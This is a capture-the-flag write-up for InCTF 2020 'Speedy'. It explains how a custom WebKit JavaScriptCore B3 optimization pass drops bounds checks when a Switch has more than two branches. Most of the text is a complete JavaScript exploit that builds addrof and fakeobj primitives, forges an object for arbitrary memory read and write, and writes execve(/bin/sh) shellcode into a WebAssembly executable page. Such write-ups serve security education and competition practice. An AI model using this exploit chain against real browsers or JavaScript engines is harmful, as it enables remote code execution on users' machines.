# InCTF 2020: Speedy

## Vulnerability

Going through the readme we can see that the optimization is implemented for
Basic Blocks with 2 branches. Lets see how this is checked in the patch - 

In b3/ChallOpt.cpp , in the `run` function -

```cpp
for (BasicBlock* block : m_proc.blocksInPreOrder()) {

    Value* branch = block->last();
    Effects effects = branch->effects();

    /* Sanity Check */
    if (!effects.terminal)
        continue;

    /* We can only optimize blocks with branches. Thus ignore stuff like Jump  */
    if (branch->numChildren() < 1 || block->numSuccessors() < 2)
        continue;
```

So the node should be a `terminal` node and have at least 2 successors. But what
if it has more ? Lets check out xrefs for nodes marked `teminal`... 

In B3Value.cpp we see 

```cpp
    case Jump:
    case Branch:
    case Switch:
    case Return:
    case Oops:
    case EntrySwitch:
        result.terminal = true;
        break;

```

So all these nodes will pass the first check. Refer
[https://webkit.org/docs/b3/intermediate-representation.html](https://webkit.org/docs/b3/intermediate-representation.html)
for b3 IR. We see that switch can branch to multiple branches. But the
optimization never takes this into consideration. Thus if there is a `check`
node in 2 branches but none in the third branch still the check in the successor
block will be removed ! 

One trick now was to "hoist" (hmm, not the exact word here but....) the `Load`
nodes preceeding the check into a pre-decessor block `check` this can be done by
common subexpression elimination by just reading a value from an array before
the switch. Here is the exploit - 

## Exploit

```js
// utils
var conversion_buffer = new ArrayBuffer(8)
var f64 = new Float64Array(conversion_buffer)
var i32 = new Uint32Array(conversion_buffer)
var BASE32 = 0x100000000
function f2i(f) {
    f64[0] = f
    return i32[0] + BASE32 * i32[1]
}
function i2f(i) {
    i32[0] = i % BASE32
    i32[1] = i / BASE32
    return f64[0]
}
function hex(x) {
    if (x < 0) return `-${hex(-x)}`
    return `0x${x.toString(16)}`
}

// exploit
let trig_arr = new Array(0x10);
let oob_arr = new Array(0x10);
let obj_arr = new Array(0x10);
let rw = new Array(0x200);
trig_arr.fill(1);
oob_arr.fill(1.1);
obj_arr.fill({});
rw.fill(1.1);

function jit(a,b){
    let h=1000;
    let d=a+1;
    let hg=trig_arr[b]; // Loads are not optimized by ChallOpt. So we need this so B3CSE eliminates further loads.
    switch(a){
    case 0:
        trig_arr[d]=h;
        break;
    case 1:
        trig_arr[d]=h;
        break
    }
    // Overwrite the size field of oob_arr
    trig_arr[d]=h;
}

function fakeobj(addr){
    oob_arr[20]=addr;
    return obj_arr[0];
}
function addrof(obj){
    obj_arr[0]=obj;
    return oob_arr[20];
}

function trigger(){
    for(let i=0;i<0x10000; i++){
        jit(0,6);
        jit(1,3);
    }
    jit(18,3);
}

function main(){
    trigger();

    let sid = Reflect.strid(oob_arr);

    i32[0] = sid;
    i32[1] = 0x01082307 - 0x20000
    let fakecell = f64[0];
    let container ={
        jsCell: fakecell,
        butterfly: fakeobj(i2f(f2i(addrof(rw))+8))
    }
    let contAddr = addrof(container);
    let fakeObjAddr = i2f(f2i(contAddr)+16);
    let fake = fakeobj(fakeObjAddr);

    function read(addr){                 // arbitrary read
        fake[0]=addr;
        return rw[0];
    }
    function write(addr,val){            // arbitrary write
        fake[0]=addr;
        rw[0]=val;
    }

    var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
    var wasm_mod = new WebAssembly.Module(wasm_code);
    var wasm_instance = new WebAssembly.Instance(wasm_mod);
    var f = wasm_instance.exports.main;
    var addr_f = addrof(f);
    var addr_shellcode = f2i(read(i2f(f2i(addr_f) + 0x28)));
    // execve(/bin/sh)
    let shellcode = [
            2.825563119134789e-71, 3.2060568105999132e-80,
  -2.5309726874116607e+35, 7.034840446283643e-309
    ]
    for(var i = 0; i < shellcode.length; i++) {
        write(i2f(addr_shellcode + i * 8), shellcode[i]);
    }
    f()
}

main()


```
